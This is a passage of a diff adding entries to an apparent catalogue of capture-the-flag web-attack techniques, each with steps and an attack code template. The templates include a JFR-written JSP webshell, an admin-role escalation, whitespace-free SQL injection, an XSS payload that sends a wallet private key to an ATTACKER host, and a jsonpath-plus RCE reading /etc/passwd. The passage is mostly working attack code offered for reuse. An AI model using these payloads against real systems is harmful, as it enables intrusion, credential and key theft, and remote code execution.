+                    "browser_charset": "Chrome < 139 auto-detects ISO-2022-JP from \\x1b(J escape",
+                    "escape_sequence": "\\x1b(J — ISO-2022-JP escape to JIS X 0201 Roman",
+                    "sanitizers_bypassed": "Jsoup (server-side) + DOMPurify 3.2.6 (client-side)",
+                    "injection_context": "<style> tag (allowed by Jsoup Safelist.relaxed().addTags('style'))",
+                    "exfil_method": "navigator.sendBeacon(webhook, document.cookie)",
+                },
+                "notes": (
+                    "This is a charset encoding differential attack. The key insight is that Java and Chrome "
+                    "support different sets of charsets. Java supports x-macroman (Mac OS Roman) but Chrome "
+                    "does not recognize it, causing Chrome to fall back to ICU charset auto-detection. The "
+                    "ISO-2022-JP escape sequence \\x1b(J embedded in the content triggers auto-detection. "
+                    "In ISO-2022-JP, \\x1b(J switches to JIS X 0201 Roman mode where certain bytes map to "
+                    "different characters, effectively reinterpreting the sanitized HTML/JS and breaking "
+                    "out of the <style> context. Chrome 139+ may have fixed auto-detection behavior. "
+                    "Alternative Java-only/browser-unsupported charsets: x-MacRoman, x-MacCyrillic, etc."
+                ),
+            }],
+            "tags": ["xss", "charset", "encoding", "iso-2022-jp", "auto-detection", "x-macroman",
+                     "jsoup-bypass", "dompurify-bypass", "email", "smtp", "webmail", "chrome", "bot"],
+        },
+    },
+
+    # ── 37. jcmd argument injection → JFR arbitrary file write → JSP webshell RCE ──
+    {
+        "name": "jcmd_jfr_file_write_jsp_rce",
+        "vuln_type": "rce",
+        "attack_metadata": {
+            "name": "jcmd argument injection via pid parameter → JFR file write to webroot → JSP webshell RCE",
+            "applies_when": (
+                "A Java web application (Tomcat/Spring) exposes diagnostic endpoints that pass user-controlled "
+                "input (typically a `pid` parameter) to `Runtime.getRuntime().exec(\"jcmd \" + pid + \" <subcommand>\")`. "
+                "An input validator blocks bash special characters (;|&$`\\!(){}[]<>*?~^'\"]) but does NOT block "
+                "spaces, dots, slashes, dashes, plus signs, or equals signs. Since `Runtime.exec(String)` splits "
+                "by whitespace (not via a shell), the attacker can inject additional jcmd arguments by including "
+                "spaces in the pid parameter. JFR (Java Flight Recorder) `JFR.start` can write recording files "
+                "to arbitrary paths. The webroot's views directory is writable (e.g., chmod 1777). JFR records "
+                "exception events that contain attacker-controlled data (e.g., URL paths from 404 errors), and "
+                "Tomcat's JSP compiler processes `<%...%>` tags even within binary JFR data."
+            ),
+            "prerequisites": [
+                "Java servlet passes user input to jcmd via Runtime.exec(String) (whitespace-split, no shell)",
+                "Input validation blocks bash specials but allows spaces, dots, slashes, +, -, =",
+                "JDK with JFR support (JDK 11+, typically JDK 17+)",
+                "Writable directory under webroot (e.g., WEB-INF/views/ with chmod 1777)",
+                "Tomcat JSP servlet configured to serve .jsp files from that directory",
+                "jdk.JavaExceptionThrow event enabled in JFR → records exception messages containing URL paths",
+            ],
+            "technique_steps_md": (
+                "1. Find the JVM PID via `/api/processes` (jcmd list)\n"
+                "2. Start JFR recording with file output to webroot:\n"
+                "   `GET /api/status?pid=1 JFR.start name=pwn settings=none "
+                "+jdk.JavaExceptionThrow#enabled=true duration=10s "
+                "filename=/usr/local/tomcat/webapps/ROOT/WEB-INF/views/shell.jsp`\n"
+                "3. Inject JSP code via HTTP requests that cause 404 exceptions:\n"
+                "   `GET /<%=new String(Runtime.getRuntime().exec(\"/readflag\").getInputStream().readAllBytes())%>.x`\n"
+                "   - Tomcat generates a jdk.JavaExceptionThrow event with the URL path as the exception message\n"
+                "   - JFR records this exception text into the .jfr file\n"
+                "4. Wait for JFR duration to complete (file written to disk)\n"
+                "5. Access the JSP: `GET /shell.jsp`\n"
+                "   - Tomcat's JSP compiler finds `<%=...%>` tags in the binary JFR data\n"
+                "   - Executes the embedded Java code → RCE achieved"
+            ),
+            "code_template": (
+                "import requests, socket, time, urllib.parse\\n"
+                "T = 'http://TARGET'\\n"
+                "JSP = '<%=new String(Runtime.getRuntime().exec(\"/readflag\").getInputStream()"
+                ".readAllBytes())%>'\\n"
+                "pid = '1 JFR.start name=pwn settings=none "
+                "+jdk.JavaExceptionThrow#enabled=true duration=10s "
+                "filename=/usr/local/tomcat/webapps/ROOT/WEB-INF/views/shell.jsp'\\n"
+                "requests.get(f'{T}/api/status', params={'pid': pid})\\n"
+                "# Inject JSP via URL path that triggers JavaExceptionThrow\\n"
+                "path = f'/{urllib.parse.quote(JSP, safe=\"/\")}.x'\\n"
+                "for _ in range(10):\\n"
+                "    s = socket.socket(); s.connect((HOST, 80))\\n"
+                "    s.sendall(f'GET {path} HTTP/1.1\\\\r\\\\nHost: {HOST}\\\\r\\\\n\\\\r\\\\n'.encode())\\n"
+                "    s.recv(4096); s.close()\\n"
+                "time.sleep(13)\\n"
+                "print(requests.get(f'{T}/shell.jsp').text)"
+            ),
+            "examples": [{
+                "params": {
+                    "jcmd_endpoint": "/api/status, /api/heap, /api/threads — all use jcmd + pid param",
+                    "validator_bypass": "InputValidator blocks ;|&$`\\!(){}[]<>*?~^'\" but allows spaces/dots/slashes/+/-/=",
+                    "jfr_command": "JFR.start name=pwn settings=none +jdk.JavaExceptionThrow#enabled=true duration=Ns filename=PATH",
+                    "exception_injection": "URL-encoded JSP tags in GET path → 404 → JavaExceptionThrow event recorded in JFR",
+                    "jsp_in_binary": "Tomcat JSP compiler finds <%...%> tags even in binary .jfr data",
+                    "writable_dir": "/usr/local/tomcat/webapps/ROOT/WEB-INF/views/ (chmod 1777)",
+                },
+                "notes": (
+                    "This technique chains three primitives: (1) jcmd argument injection via whitespace in the pid "
+                    "parameter — Runtime.exec(String) splits by whitespace without invoking a shell, bypassing bash "
+                    "special char filters; (2) JFR file write — JFR.start with a custom filename writes recording "
+                    "data to any writable path; (3) JFR exception recording — enabling jdk.JavaExceptionThrow "
+                    "captures exception messages that include attacker-controlled URL paths, embedding JSP code "
+                    "in the recording file. Tomcat's JSP compiler is tolerant of binary data surrounding JSP tags, "
+                    "so it finds and executes the embedded <%=...%> code from the .jfr binary."
+                ),
+            }],
+            "tags": ["rce", "jcmd", "jfr", "java-flight-recorder", "argument-injection", "file-write",
+                     "jsp", "webshell", "tomcat", "java", "runtime-exec", "input-validation-bypass"],
+        },
+    },
+
+    # ── 38. Spring auth handler NPE → ROLE_ADMIN escalation ──
+    {
+        "name": "spring_auth_handler_npe_role_escalation",
+        "vuln_type": "auth_bypass",
+        "attack_metadata": {
+            "name": "Spring AuthenticationSuccessHandler NPE via empty JSON input → generic Exception catch grants admin role",
+            "applies_when": (
+                "A Spring Security application has a custom `AuthenticationSuccessHandler` that parses a "
+                "request parameter (e.g., `ShieldParam`) as JSON using Jackson `ObjectMapper().readTree()`. "
+                "The handler has layered try-catch blocks: `JsonParseException` → adds ROLE_USER, generic "
+                "`Exception` → adds ROLE_ADMIN. When the parameter is an empty string, `readTree(\"\")` "
+                "returns null in Jackson 2.x. Kotlin's non-null assertion (`!!`) on the null result throws "
+                "a `KotlinNullPointerException` (or `NullPointerException`), which is NOT a `JsonParseException` "
+                "but IS caught by the generic `Exception` handler, which mistakenly grants ROLE_ADMIN. "
+                "This is conceptually related to CVE-2024-22234 (Spring Security auth bypass via NPE)."
+            ),
+            "prerequisites": [
+                "Spring Security with custom AuthenticationSuccessHandler",
+                "Handler parses a request parameter as JSON (Jackson ObjectMapper.readTree)",
+                "Layered catch blocks: specific exception → normal role, generic Exception → elevated role",
+                "Jackson readTree returns null for empty string input (Jackson 2.x behavior)",
+                "Kotlin non-null assertion (!!) or equivalent null dereference triggers NPE",
+                "NPE falls through specific catch to generic Exception catch that grants ROLE_ADMIN",
+            ],
+            "technique_steps_md": (
+                "1. Register a normal user account via the signup form (with CSRF token)\\n"
+                "2. POST login with credentials + `ShieldParam=` (empty string):\\n"
+                "   - `ObjectMapper().readTree(\"\")` → returns null\\n"
+                "   - `shieldParamNode!!` → throws NullPointerException\\n"
+                "   - `catch (JsonParseException)` → not matched\\n"
+                "   - `catch (Exception)` → matched → `ROLE_ADMIN` granted\\n"
+                "3. Session now has ROLE_ADMIN authority\\n"
+                "4. Access admin-only endpoints protected by `@EndPointManager` interceptor"
+            ),
+            "code_template": (
+                "import requests\\n"
+                "from bs4 import BeautifulSoup\\n"
+                "session = requests.Session()\\n"
+                "# Get CSRF token\\n"
+                "csrf_page = session.get(f'{URL}/user/login').text\\n"
+                "csrf = BeautifulSoup(csrf_page, 'html.parser').find('input', {'name': '_csrf'})['value']\\n"
+                "# Login with empty ShieldParam → NPE → ROLE_ADMIN\\n"
+                "session.post(f'{URL}/user/login', data={\\n"
+                "    '_csrf': csrf, 'username': USER, 'password': PASS, 'ShieldParam': ''\\n"
+                "})"
+            ),
+            "examples": [{
+                "params": {
+                    "json_parser": "Jackson ObjectMapper().readTree(\"\") returns null for empty string",
+                    "npe_trigger": "Kotlin !! non-null assertion on null → KotlinNullPointerException",
+                    "catch_hierarchy": "catch(JsonParseException) → ROLE_USER; catch(Exception) → ROLE_ADMIN",
+                    "cve_reference": "Conceptually related to CVE-2024-22234 (Spring Security NPE auth bypass)",
+                },
+                "notes": (
+                    "The root cause is a flawed exception handling hierarchy in the AuthenticationSuccessHandler. "
+                    "The developer intended JsonParseException to catch malformed JSON and grant normal user role, "
+                    "but NullPointerException from null JSON parsing result is a different exception type that "
+                    "falls through to the generic Exception handler. The generic handler was likely intended as a "
+                    "fallback for unexpected errors but mistakenly grants ROLE_ADMIN instead of denying access."
+                ),
+            }],
+            "tags": ["auth-bypass", "spring-security", "npe", "null-pointer", "jackson", "kotlin",
+                     "exception-handling", "role-escalation", "cve-2024-22234"],
+        },
+    },
+
+    # ── 39. Kotlin reflection method invocation + parenthesized UNION SQLi ──
+    {
+        "name": "reflection_method_invocation_union_sqli",
+        "vuln_type": "sqli",
+        "attack_metadata": {
+            "name": "Kotlin reflection controller invokes DataProvider methods with user-controlled params → whitespace-free UNION SQLi",
+            "applies_when": (
+                "A Kotlin/Spring application exposes an API endpoint that uses reflection "
+                "(`KCallable.call()`) to dynamically invoke methods on a DataProvider class based on "
+                "user-controlled parameters. The method name (`s`), query (`q`), and a magic parameter "
+                "(`mp`) are all taken from request params. A `filterQuery()` function blocks whitespace, "
+                "`runtime`, `java`, `/`, `*`, `%`, `DROP`, `DELETE`, and enforces max length 40. However, "
+                "SQL parenthesized syntax `UNION(SELECT(col)FROM(table))` contains no whitespace and bypasses "
+                "all filters. The reflection controller splits the query by spaces and selects a token by index "
+                "(depending on `magicParam` type), allowing the attacker to position the SQLi payload at "
+                "the correct split index."
+            ),
+            "prerequisites": [
+                "API endpoint uses Kotlin reflection to call DataProvider methods by name",
+                "Method name, query, and magic param are all user-controlled request parameters",
+                "ReflectionController splits query by space and selects token by index based on magicParam type",
+                "DataProvider.selectQuery() appends user input to a base SELECT query",
+                "filterQuery() blocks whitespace but not SQL keywords (UNION, SELECT, FROM) or parentheses",
+                "H2 (or compatible) database supports parenthesized SQL syntax",
+                "Admin role required (obtained via separate auth bypass)",
+                "Session activation step required (e.g., /api/v6/.../query?q=Y)",
+            ],
+            "technique_steps_md": (
+                "1. Obtain ROLE_ADMIN via auth bypass (e.g., NPE role escalation)\\n"
+                "2. Activate session: `GET /api/v6/shieldosint/query?q=Y`\\n"
+                "3. Craft UNION SQLi with no whitespace:\\n"
+                "   `s=selectQuery` (method to invoke via reflection)\\n"
+                "   `q=a a UNION(SELECT(sdata)FROM(SITE_SECRET))` (3 space-separated tokens)\\n"
+                "   `mp=a` (String type → split by space, take index 2)\\n"
+                "4. ReflectionController splits q by space → index[2] = `UNION(SELECT(sdata)FROM(SITE_SECRET))`\\n"
+                "5. DataProvider.selectQuery() runs filterQuery() on the extracted token:\\n"
+                "   - No whitespace ✓, no blocked keywords ✓, length ≤ 40 ✓\\n"
+                "6. Final SQL: `SELECT SUBJECT FROM QUESTION WHERE ID>=1 and ID<=10 UNION(SELECT(sdata)FROM(SITE_SECRET))`\\n"
+                "7. Flag returned in response"
+            ),
+            "code_template": (
+                "import requests\\n"
+                "from bs4 import BeautifulSoup\\n"
+                "session = requests.Session()\\n"
+                "# After signup + admin login (NPE trick)\\n"
+                "session.get(f'{URL}/api/v6/shieldosint/query?q=Y')  # activate session\\n"
+                "r = session.get(f'{URL}/api/v6/shieldosint/search', params={\\n"
+                "    's': 'selectQuery',\\n"
+                "    'q': 'a a UNION(SELECT(sdata)FROM(SITE_SECRET))',\\n"
+                "    'mp': 'a'\\n"
+                "})\\n"
+                "print(r.text)  # flag from SITE_SECRET.sdata"
+            ),
+            "examples": [{
+                "params": {
+                    "reflection_api": "KCallable.call(instance, finalQuery) invokes DataProvider.selectQuery()",
+                    "split_logic": "String magicParam → query.split(' ')[2]; Int → .last(); Boolean → .first()",
+                    "filter_bypass": "UNION(SELECT(col)FROM(table)) — no whitespace, no blocked chars, ≤40 chars",
+                    "database": "H2 in-memory DB (jdbc:h2:~/testdb) — supports parenthesized SQL",
+                    "target_table": "SITE_SECRET (sdata column contains the flag)",
+                },
+                "notes": (
+                    "The combination of reflection-based method invocation and whitespace-free SQL injection "
+                    "is the key insight. The reflection controller allows calling any declared function on "
+                    "DataProvider by name, and the split-by-space logic lets the attacker control which "
+                    "token is passed to the SQL query. The parenthesized UNION syntax "
+                    "`UNION(SELECT(col)FROM(table))` is valid SQL in H2/MySQL and bypasses whitespace-based "
+                    "WAF/filter patterns. The magicParam type determines the split index: String=index[2], "
+                    "Int=last(), Boolean=first()."
+                ),
+            }],
+            "tags": ["sqli", "union", "reflection", "kotlin", "spring", "h2-database", "whitespace-bypass",
+                     "waf-bypass", "parenthesized-sql", "method-invocation"],
+        },
+    },
+
+    # ── 40. Chrome extension strict vs loose comparison bypass — array action ──
+    {
+        "name": "chrome_extension_strict_loose_comparison_bypass",
+        "vuln_type": "auth_bypass",
+        "attack_metadata": {
+            "name": "Chrome extension content_script === vs background.js == comparison bypass via array action parameter",
+            "applies_when": (
+                "A Chrome extension uses a content_script as a message relay between web pages (via "
+                "`window.postMessage`) and the background service worker (via `chrome.runtime.sendMessage`). "
+                "The content_script checks `event.data.action === 'sensitiveAction'` using strict equality "
+                "to route sensitive actions through password-gated handlers. The background.js checks "
+                "`request.action == 'sensitiveAction'` using loose equality to dispatch actions. In "
+                "JavaScript, `['sensitiveAction'] === 'sensitiveAction'` is `false`, but "
+                "`['sensitiveAction'] == 'sensitiveAction'` is `true` (array-to-string coercion). By "
+                "sending the action as a single-element array, the attacker bypasses the content_script's "
+                "strict check (skipping password verification) while still matching the background.js "
+                "loose check, gaining access to sensitive extension APIs without credentials."
+            ),
+            "prerequisites": [
+                "Chrome extension with content_script message relay architecture",
+                "content_script uses === (strict equality) for action routing to password-gated handlers",
+                "background.js uses == (loose equality) for action dispatching",
+                "Fallback path in content_script forwards unrecognized actions to background.js via chrome.runtime.sendMessage",
+                "Sensitive action (getSessionData, sendTransaction, etc.) returns private data when called from background.js",
+                "XSS or attacker-controlled page in same origin can call window.postMessage to content_script",
+            ],
+            "technique_steps_md": (
+                "1. Find XSS vector in dapp page (e.g., `from` param in tracking-events.html rendered via innerHTML)\\n"
+                "2. Trigger bot to visit dapp URL with XSS payload:\\n"
+                "   `http://dapp:PORT/?tab=tracking&from=<img src=x onerror='PAYLOAD' />`\\n"
+                "3. Bot's extension sets password and calls `unlockWithPassword` → active session with funds\\n"
+                "4. XSS payload sends message with action as array:\\n"
+                "   `window.metamuskExtension.sendMessage({action: ['getSessionData']})`\\n"
+                "5. content_script check: `event.data.action === 'getSessionData'` → false (array !== string)\\n"
+                "   → skips password-gated handleGetSessionData\\n"
+                "   → falls through to generic `chrome.runtime.sendMessage(event.data, ...)` forwarding\\n"
+                "6. background.js check: `request.action == 'getSessionData'` → true (array == string coercion)\\n"
+                "   → calls handleGetSessionData → returns sessionData with privateKey, rpcEndpoint, etc.\\n"
+                "7. XSS exfiltrates sessionData to attacker server\\n"
+                "8. Attacker uses stolen privateKey to perform blockchain transactions (deposit to Vault)"
+            ),
+            "code_template": (
+                "# XSS payload (URL-encoded in 'from' parameter):\\n"
+                "# <img src=x onerror='PAYLOAD' />\\n"
+                "# where PAYLOAD is:\\n"
+                "(async function(){\\n"
+                "  await new Promise(r=>setTimeout(r,3000));\\n"
+                "  let out = await window.metamuskExtension.sendMessage({\\n"
+                "    action: ['getSessionData']  // array bypasses === in content_script\\n"
+                "  });\\n"
+                "  let { sessionData } = out;\\n"
+                "  fetch(`http://ATTACKER/log?message=${\\n"
+                "    encodeURIComponent(JSON.stringify(sessionData))\\n"
+                "  }`, {method:'GET', mode:'no-cors'});\\n"
+                "})()"
+            ),
+            "examples": [{
+                "params": {
+                    "content_script_check": "event.data.action === 'getSessionData' (strict, returns false for array)",
+                    "background_check": "request.action == 'getSessionData' (loose, returns true for array)",
+                    "js_coercion": "['getSessionData'] == 'getSessionData' is true (Array.toString() → 'getSessionData')",
+                    "xss_vector": "tracking-events.html innerHTML renders URL 'from' parameter unsanitized",
+                    "sensitive_data": "sessionData contains: privateKey, rpcEndpoint, playerAddress, challengeContract, uuid",
+                    "bot_url_filter": "re.match(r'^http:\\/\\/metamusk-[a-z]+:[0-9]{4,5}\\/.*$', dapp_url)",
+                },
+                "notes": (
+                    "This technique exploits a subtle JavaScript type coercion difference between strict (===) "
+                    "and loose (==) equality operators in a Chrome extension's message passing architecture. "
+                    "The content_script acts as a security gate, requiring password verification for sensitive "
+                    "actions using strict comparison. The background service worker uses loose comparison for "
+                    "the same action dispatch. A single-element array ['action'] passes through the gate "
+                    "because strict comparison with a string returns false, but matches the background's "
+                    "loose comparison because JavaScript's Array.prototype.toString() converts ['action'] to "
+                    "'action'. The attack requires an XSS vector to inject code that calls the extension's "
+                    "messaging API, and a bot that has an authenticated session with the extension."
+                ),
+            }],
+            "tags": ["auth-bypass", "chrome-extension", "type-coercion", "strict-equality", "loose-equality",
+                     "javascript", "xss", "wallet", "private-key-theft", "blockchain", "content-script",
+                     "background-js", "postmessage", "bot"],
+        },
+    },
+
+    # ── 41. SVG bitmap measurement side-channel via noisy artifact + descramble + majority voting ──
+    {
+        "name": "svg_bitmap_measurement_side_channel_descramble",
+        "vuln_type": "information_disclosure",
+        "attack_metadata": {
+            "name": "SVG bitmap font side-channel — noisy measurement artifacts + PRNG descramble + majority voting recovers flag",
+            "applies_when": (
+                "A multi-origin web application encodes a secret (flag) as a bitmap font rendered into an SVG "
+                "with `<rect filter=...>` elements (filtered = bit '1', clear = bit '0'). The SVG is only "
+                "accessible to a staff bot via cookie authentication and protected by X-Frame-Options: DENY "
+                "and CORP: same-site. However, a bot popup chain (coordinator → preview → export → inspector) "
+                "measures each cell via a timing-like oracle: filtered cells receive a higher 'boost' value "
+                "than clear cells in a signal/baseline delta measurement. The resulting deltaRows artifact is "
+                "scrambled with a seeded Fisher-Yates column permutation and stored server-side. The attacker "
+                "can poll the completed artifact along with the renderSeed and layoutSeed. By reproducing the "
+                "xorshift PRNG, the column permutation can be reversed. A known header pattern (generated from "
+                "layoutSeed) enables threshold calibration. Multiple sessions with majority voting reduce noise "
+                "to recover the full bit matrix, which is decoded using 5×7 Adafruit GFX bitmap font matching."
+            ),
+            "prerequisites": [
+                "Flag encoded as 5×7 bitmap font in SVG <rect filter=...> elements",
+                "Staff-only SVG endpoint with cookie auth + CORP: same-site + X-Frame-Options: DENY",
+                "Bot popup chain that measures filtered/clear cells and produces noisy delta artifacts",
+                "Completed artifact (deltaRows), renderSeed, and layoutSeed exposed via review API",
+                "Fisher-Yates shuffle based on xorshift PRNG with seed derived from renderSeed",
+                "Known header pattern generated from layoutSeed for threshold calibration",
+                "parse5-based HTML validator accepts specific bootstrap config format",
+                "Scan window constraint: scanWidth × scanHeight ≤ 350",
+            ],
+            "technique_steps_md": (
+                "1. Register/login, create window-v1 config notes for each scan window\\n"
+                "   - Total bitmap: 297×7, window size 50×7 (6 windows)\\n"
+                "   - HTML must pass parse5 validator (section > svg > filter > feComponentTransfer > feFuncR/G/B + p)\\n"
+                "2. Submit for review → bot popup chain runs → noisy artifact generated\\n"
+                "3. Poll `GET /api/review/:sessionId` until `state=completed`\\n"
+                "   - Receive: deltaRows (scrambled), renderSeed, layoutSeed\\n"
+                "4. Descramble: reproduce xorshift PRNG from renderSeed\\n"
+                "   - Fisher-Yates full column permutation → rank-based local permutation for window slice\\n"
+                "   - Apply inverse permutation to deltaRows\\n"
+                "5. Threshold calibration: reproduce xorshift PRNG from layoutSeed\\n"
+                "   - Generate 20×7 known header pattern\\n"
+                "   - threshold = (mean(filtered_deltas) + mean(clear_deltas)) / 2\\n"
+                "6. Repeat 3× sessions per window → majority voting per pixel\\n"
+                "7. Decode: skip header(20) + spacer(2), split into 5×7 symbols\\n"
+                "   - Hamming distance match against Adafruit GFX 5×7 font → flag characters"
+            ),
+            "code_template": (
+                "# xorshift PRNG (matching JS implementation)\\n"
+                "def xorshift(seed):\\n"
+                "    value = seed & 0xFFFFFFFF\\n"
+                "    def _next():\\n"
+                "        nonlocal value\\n"
+                "        value ^= (value << 13) & 0xFFFFFFFF\\n"
+                "        value ^= (value >> 17)\\n"
+                "        value ^= (value << 5) & 0xFFFFFFFF\\n"
+                "        value = value & 0xFFFFFFFF\\n"
+                "        return value / 0xFFFFFFFF\\n"
+                "    return _next\\n\\n"
+                "# Fisher-Yates column order from renderSeed\\n"
+                "def build_column_order(render_seed, width):\\n"
+                "    rng = xorshift(seed_from_hex(render_seed))\\n"
+                "    perm = list(range(width))\\n"
+                "    for i in range(width - 1, 0, -1):\\n"
+                "        j = int(rng() * (i + 1))\\n"
+                "        perm[i], perm[j] = perm[j], perm[i]\\n"
+                "    return perm"
+            ),
+            "examples": [{
+                "params": {
+                    "origins": "3-origin: app.pixelpad.local, share.pixelpad.local, account.pixelpad.local",
+                    "bitmap_encoding": "5×7 Adafruit GFX font → SVG <rect filter=...> for '1' bits, plain <rect> for '0'",
+                    "measurement_oracle": "measureCell(): filtered=1 gets boost ~0.55+, clear=0 gets boost ~0.03+ (noisy)",
+                    "scrambling": "Fisher-Yates shuffle with xorshift PRNG from renderSeed → column permutation",
+                    "header_calibration": "20-col random header from layoutSeed, known bits → threshold = midpoint of filtered/clear means",
+                    "noise_reduction": "3× session majority voting per pixel eliminates per-session noise",
+                    "total_bitmap": "297 columns × 7 rows, 6 scan windows of 50×7",
+                },
+                "notes": (
+                    "This is a sophisticated multi-stage side-channel attack on a web application that encodes "
+                    "secrets in SVG bitmap data. The key insight is that even though the SVG is protected by "
+                    "strict access controls (staff cookie, CORP, X-Frame-Options), the bot's measurement popup "
+                    "chain leaks information through noisy delta artifacts that are accessible to the attacker. "
+                    "The noise is overcome through statistical analysis: known header bits enable per-session "
+                    "threshold calibration, and multi-session majority voting reduces error rate. The column "
+                    "scrambling is reversible because the renderSeed is exposed in the completed review data."
+                ),
+            }],
+            "tags": ["side-channel", "svg", "bitmap", "measurement-oracle", "prng-descramble",
+                     "fisher-yates", "xorshift", "majority-voting", "noise-reduction", "threshold-calibration",
+                     "multi-origin", "popup-chain", "bot", "information-disclosure"],
+        },
+    },
+
+    # ── 42. GraphQL Relay Node interface authorization bypass ──
+    {
+        "name": "graphql_relay_node_interface_auth_bypass",
+        "vuln_type": "auth_bypass",
+        "attack_metadata": {
+            "name": "GraphQL Relay Node interface bypasses per-type authorization — node(id) lacks is_secret check that note(id) enforces",
+            "applies_when": (
+                "A GraphQL API implements the Relay-style global `Node` interface with a `node(id: ID!): Node` "
+                "query field alongside type-specific query fields (e.g., `note(id: ID!): Note`). The type-specific "
+                "resolver (`note`) enforces authorization checks (e.g., checking `is_secret` flag and throwing "
+                "an error for classified documents), but the generic `node` resolver queries the same database "
+                "table without applying the same authorization logic. Since both resolvers return the same "
+                "underlying data (just through different GraphQL paths), an attacker can bypass the authorization "
+                "by querying through `node(id)` instead of `note(id)`, using an inline fragment "
+                "`... on Note { title content }` to access the concrete type's fields."
+            ),
+            "prerequisites": [
+                "GraphQL API with Relay-style Node interface (node(id: ID!): Node query)",
+                "Type-specific resolver (note) has authorization checks (e.g., is_secret)",
+                "Node resolver queries same data without equivalent authorization checks",
+                "Introspection enabled (to discover node field and Note type)",
+                "Sequential integer IDs allow inferring hidden record IDs from gaps",
+            ],
+            "technique_steps_md": (
+                "1. Introspect schema to discover query fields:\\n"
+                "   `{ __schema { queryType { fields { name } } } }`\\n"
+                "   → finds: notes, note, me, node\\n"
+                "2. List public notes to find ID gaps:\\n"
+                "   `{ notes { id title isSecret } }` → ids 1,3,4,5 (id=2 missing)\\n"
+                "3. Try direct access: `{ note(id: \"2\") { title content } }`\\n"
+                "   → 'Access Denied: This note is classified.'\\n"
+                "4. Probe via Node interface: `{ node(id: \"2\") { id } }`\\n"
+                "   → returns object (not null) — no auth check\\n"
+                "5. Use inline fragment for concrete fields:\\n"
+                "   `{ node(id: \"2\") { ... on Note { title content } } }`\\n"
+                "   → returns classified note content with flag"
+            ),
+            "code_template": (
+                "import json, urllib.request\\n"
+                "def gql(url, query):\\n"
+                "    req = urllib.request.Request(url, json.dumps({'query': query}).encode(),\\n"
+                "        {'Content-Type': 'application/json'})\\n"
+                "    return json.loads(urllib.request.urlopen(req).read())\\n\\n"
+                "# Bypass: use node() instead of note()\\n"
+                "result = gql(ENDPOINT, '''\\n"
+                "{ node(id: \"2\") { ... on Note { title content } } }\\n"
+                "''')\\n"
+                "print(result['data']['node']['content'])  # flag"
+            ),
+            "examples": [{
+                "params": {
+                    "protected_resolver": "note(id) checks is_secret → throws GraphQLError('Access Denied')",
+                    "unprotected_resolver": "node(id) queries same table without is_secret check",
+                    "inline_fragment": "... on Note { title content } — resolves concrete fields through Node interface",
+                    "id_inference": "Sequential integer IDs — gap in public notes list reveals hidden note ID",
+                    "apollo_server": "ApolloServer with introspection: true, depthLimit(5)",
+                },
+                "notes": (
+                    "This is a classic GraphQL authorization inconsistency where the same data is accessible "
+                    "through multiple query paths, but authorization is only applied to one path. The Relay "
+                    "Node interface pattern (node(id: ID!): Node) is designed for global object lookup, but "
+                    "developers often forget to replicate per-type authorization checks in the generic node "
+                    "resolver. The inline fragment `... on Note` allows accessing concrete type fields through "
+                    "the interface, effectively bypassing the type-specific resolver's authorization."
+                ),
+            }],
+            "tags": ["auth-bypass", "graphql", "relay", "node-interface", "inline-fragment",
+                     "authorization-inconsistency", "introspection", "apollo-server", "idor"],
+        },
+    },
+
+    # ── 43. jsonpath-plus preventEval:false RCE ──
+    {
+        "name": "jsonpath_plus_preventeval_rce",
+        "vuln_type": "rce",
+        "attack_metadata": {
+            "name": "jsonpath-plus preventEval:false allows JavaScript code execution via script expressions",
+            "applies_when": (
+                "A Node.js application uses the `jsonpath-plus` library to evaluate user-supplied JSONPath "
+                "expressions with `preventEval: false` (or the option is omitted, as it defaults to false). "
+                "The JSONPath-plus library supports script expressions `?(...)` that are compiled into JavaScript "
+                "and executed via `Function()` constructor. An attacker can craft a JSONPath expression that "
+                "escapes the intended JSON query context and executes arbitrary JavaScript, including accessing "
+                "`process.mainModule.require('child_process')` for OS command execution. The endpoint may be "
+                "restricted (e.g., admin-only), requiring a prior authentication bypass or privilege escalation."
+            ),
+            "prerequisites": [
+                "jsonpath-plus library used server-side in Node.js",
+                "preventEval is false (default) or explicitly set to false",
+                "User-controlled jsonPath expression reaches JSONPath() call",
+                "Endpoint accessible (directly or after auth bypass / privilege escalation)",
+            ],
+            "technique_steps_md": (
+                "1. Identify endpoint that accepts a JSONPath expression (e.g., admin search API)\\n"
+                "2. Confirm jsonpath-plus usage with preventEval: false (source code or behavior)\\n"
+                "3. Craft RCE payload using script expression:\\n"
+                "   `$..[?(p=\"this.process.mainModule.require('child_process').execSync('id')\";`\\n"
+                "   `test=''[['constructor']][['constructor']](p);test())]`\\n"
+                "4. Send payload as the jsonPath parameter to the vulnerable endpoint\\n"
+                "5. The `Function()` constructor compiles and executes the injected JavaScript\\n"
+                "6. Use RCE to read files, establish reverse shell, or pivot to other services"
+            ),
+            "code_template": (
+                "import requests\\n"
+                "s = requests.Session()\\n"
+                "# Authenticate first (e.g., admin login)\\n"
+                "s.headers['Authorization'] = f'Bearer {token}'\\n\\n"
+                "payload = {\\n"
+                "    'jsonPath': '$..[?(p=\"this.process.mainModule.require(\\\"child_process\\\")'"
+                ".execSync(\\\"cat /etc/passwd\\\").toString()\";'"
+                "test=\\\"\\\"[[\\\"constructor\\\"]][[\\\"constructor\\\"]](p);test())]',\\n"
+                "    'searchTerm': ''\\n"
+                "}\\n"
+                "r = s.post(f'{URL}/api/admin/resumes/search', json=payload)\\n"
+                "print(r.text)"
+            ),
+            "examples": [{
+                "params": {
+                    "library": "jsonpath-plus (npm)",
+                    "vulnerable_option": "preventEval: false",
+                    "execution_mechanism": "Function() constructor via script expression ?(…)",
+                    "payload_pattern": "$..[?(p=\"this.process.mainModule.require('child_process').execSync('cmd')\";test=''[['constructor']][['constructor']](p);test())]",
+                    "requires_auth": "Admin role JWT required (obtained via prior SQLi credential extraction)",
+                },
+                "notes": (
+                    "The jsonpath-plus library's script expression feature compiles user-supplied expressions "
+                    "into JavaScript code using the Function() constructor. When preventEval is false (the default), "
+                    "there is no sandboxing or restriction on what code can be executed. The technique uses "
+                    "''[['constructor']][['constructor']] to reach the Function constructor from a string literal, "
+                    "bypassing simple keyword filters. This is a well-known prototype chain trick for accessing "
+                    "Function() from any JavaScript object."
+                ),
+            }],
+            "tags": ["rce", "jsonpath-plus", "preventEval", "script-expression", "function-constructor",
+                     "nodejs", "npm", "code-injection", "server-side"],
+        },
+    },
+
+    # ── 44. PostgreSQL plperlu environment variable read for flag exfiltration ──
+    {
+        "name": "postgresql_plperlu_env_var_flag_read",
+        "vuln_type": "information_disclosure",
+        "attack_metadata": {
+            "name": "PostgreSQL PL/Perl(U) function reads container environment variables containing secrets",
+            "applies_when": (
